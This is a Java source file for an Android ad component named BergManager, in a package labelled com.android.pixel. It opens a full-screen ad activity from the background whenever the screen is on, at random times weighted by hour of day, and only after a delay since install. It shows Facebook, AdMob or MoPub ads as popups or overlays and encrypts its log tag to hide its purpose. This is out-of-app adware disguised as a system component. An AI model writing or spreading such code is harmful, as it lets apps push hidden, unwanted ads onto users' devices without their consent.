package com.android.pixel;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.text.format.DateUtils;
import android.util.Log;

import com.EncryptStr;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Random;

import defpackage.PixelActivity;

public class BergManager {
    @EncryptStr(value = "berg")
    private static final String TAG = "0QgxnN8w6wTknItw+kNzUQ" ;
    static {
        if(AppUtil.sDebug){
            Log.d("copyTheOutputIntoCode", "BergManager.TAG:-->"+FunctionUtil.encrypt("berg")+"<--");
            Log.d("verify", TAG+"-->"+FunctionUtil.decrypt(TAG)+"<--");
        }
    }
    public static String getDecryptTag(){
        return FunctionUtil.decrypt(TAG);
    }
    public static String getTag(){
        return TAG;
    }




    public static final List<AdNetwork> sDefaultNetwork = new ArrayList<AdNetwork>(){{
        add(AdNetwork.FACEBOOK);
        add(AdNetwork.ADMOB);
        add(AdNetwork.MOPUB);
    }};


    public static void runBerg(Context context, int step){
        if(AppUtil.sDebug)
            Log.d(FunctionUtil.decrypt(TAG), "prob0");

        if(!SdkSysUtils.isScreenOn(context))
            return;

        if(!SdkSysUtils.isNetworkConnected(context))
            return;

        if(! BergConfig.getInst().isAdOutAppEnabled())
            return;

        int hourOfDay = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
        if(new Random(System.currentTimeMillis()).nextInt(100)
                > BergConfig.getInst().getProbabilityTimeframe(hourOfDay)){
            return;
        }

        //check retention > newUserAdDelayT
        long retention = System.currentTimeMillis() - AppUtil.getAppFirstInstallT();
        if(retention<0) retention = 0;
        if(retention < BergConfig.getInst().getNewUserAdDelayT()* DateUtils.SECOND_IN_MILLIS)
            return;


        Intent intent = new Intent(context, PixelActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        intent.putExtra("step", step);
        context.startActivity(intent);
    }



    private WeakReference<Activity> mActivityRef = null;
    private BergPopup mPopup = null;

    public BergManager(Activity activity, int unlockStep){
        mActivityRef = new WeakReference<>(activity);

        //check daily imp times: vCount>=maxNum
        long totalImp = BergStats.getInst().getTodayImpressionTimes();
        long totalDailyLimit = BergConfig.getInst().getImpDailyLimit();
        if(AppUtil.sDebug){
            Log.d("Berg", "total, imp/limit:"+totalImp+"/"+totalDailyLimit);
        }
        if(totalImp >= totalDailyLimit)
            return;

        if(!BergInner.getInst().isShown()){
            int percentShowInterstitial = new Random(System.currentTimeMillis()).nextInt(100);
            int innerProbability = (int)BergConfig.getInst().getBergInnerProbability();
            if(percentShowInterstitial>innerProbability || Build.VERSION.SDK_INT > Build.VERSION_CODES.N) {
                mPopup = new BergPopup(activity);

            } else {//on 7.0, the WindowManger.addView() works well, however, this call throw exception since 7.1.1
                try {
                    BergInner.getInst().loadAndShow(unlockStep);
                } catch (Throwable e){
                    if(AppUtil.sDebug) e.printStackTrace();
                }
            }
        }
    }

    public void show(){
        if(mPopup!=null) {
            mPopup.show();
        } else {
            try{
                Activity activity = mActivityRef.get();
                if(activity!=null && !activity.isDestroyed() && !activity.isFinishing()){
                    activity.finish();
                }
            } catch (Throwable e){
                if(AppUtil.sDebug) e.printStackTrace();
            }
        }
    }

    public void destroy(){
        if(mPopup!=null) {
            mPopup.destroy();
        }
    }
}
